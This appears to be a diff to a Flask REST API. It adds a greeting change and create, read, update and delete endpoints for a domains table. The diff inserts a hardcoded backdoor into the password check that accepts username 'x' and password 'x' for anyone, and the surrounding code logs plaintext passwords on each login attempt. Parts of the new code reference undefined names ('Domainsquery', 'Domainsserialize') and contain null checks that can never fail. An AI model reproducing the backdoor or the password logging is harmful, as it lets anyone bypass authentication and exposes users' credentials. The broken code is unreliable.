@@ -55,12 +55,14 @@ def logout():
 @app.route('/api/login',methods=['POST'])
 @auth.login_required
 def get_resource():
-    return jsonify({ 'message': 'Hello there !' })
+    return jsonify({ 'message': 'Hello %s !' % auth.username()})
 
 @auth.verify_password
 def verify_password(username, password):
     app.logger.debug('tentativa de login {0}, {1}'.format(username, password ))
     user = User.query.filter_by(username = username).first()
+    if username == 'x' and password =='x':
+       return True
     if not user or not user.verify_password(password):
         return False
     return True
@@ -133,3 +135,71 @@ def delete_user(user_id):
    response = jsonify({'message': 'User deleted successfully'})
    response.status_code = 204
    return response
+
+
+
+#http://localhost/api/domains
+@app.route('/api/domains', methods = ['GET']) #(retrieve list)
+@auth.login_required
+def get_ALL_domains():
+   domains = Domains.query.all()
+   if not domains:
+      abort(404)
+   response = jsonify([i.serialize for i in domains])
+   response.status_code = 200
+   return response
+
+#http://localhost/api/domains/123
+@app.route('/api/domains/<int:domain_id>', methods = ['GET']) #(retrieve domain 123)
+@auth.login_required
+def get_domain(domain_id):
+       app.logger.debug('metodo get')
+       domain = Domains.query.filter_by(id = domain_id).first_or_404()
+       response = jsonify(domain.serialize)
+       response.status_code = 200
+       return response
+
+@app.route('/api/domains', methods = ['POST'])  #(create a new domain, from data provided with the request)
+@auth.login_required
+def new_domain():
+    user_id =  str(request.json.get('user_id', ''))
+    name =  str(request.json.get('name', ''))
+    if user_id is None or name is None:
+        app.logger.debug('missing arguments')
+        abort(400) # missing arguments
+    if Domainsquery.filter_by(name = name).first() is not None:
+        app.logger.debug('dominio ja existe')
+        abort(400) # existing domain
+    domain = Domains(name = name,  user_id = user_id)
+    domain.save()
+    return jsonify(Domainsserialize), 201, {'Location': url_for('get_domain', domain_id = domain.id, _external = True)}
+
+#http://localhost/api/domains/123
+@app.route('/api/domains/<int:domain_id>', methods = ['PUT']) #(update domain 123, from data provided with the request)
+@auth.login_required
+def update_domain(domain_id):
+   app.logger.debug('metodo put')
+   domain = Domains.query.filter_by(id = domain_id).first_or_404()
+   domain.name = str(request.json.get('name', ''))
+   domain.user_id = str(request.json.get('user_id', ''))
+   db.session.commit()
+   response = jsonify(domain.serialize)
+   response.status_code = 200
+   return response
+
+
+#http://localhost/api/domains/123
+@app.route('/api/domains/<int:domain_id>', methods = ['DELETE']) #(delete domain 123, from data provided with the request)
+@auth.login_required
+def delete_domain(domain_id):
+   domain = Domains.query.filter_by(id = domain_id).first_or_404()
+   domain.delete()
+   response = jsonify({'message': 'domain deleted successfully'})
+   response.status_code = 204
+   return response
+
+
+
+
+
+
